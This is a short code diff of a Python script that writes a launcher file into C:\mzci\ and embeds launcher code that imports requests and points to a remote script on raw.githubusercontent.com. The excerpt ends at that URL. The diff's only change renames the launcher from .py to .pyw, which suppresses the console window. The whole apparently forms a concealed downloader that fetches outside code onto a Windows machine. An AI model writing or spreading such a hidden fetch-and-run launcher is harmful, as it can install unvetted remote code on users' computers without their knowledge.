@@ -1,5 +1,5 @@
 import os
-ruta_launcher = r"C:\mzci\launcher.py"
+ruta_launcher = r"C:\mzci\launcher.pyw"
 os.makedirs(os.path.dirname(ruta_launcher), exist_ok=True)
 codigo_launcher = '''import requests
 url = "https://raw.githubusercontent.com/mrmorcilla/insha/main/cowd.py"
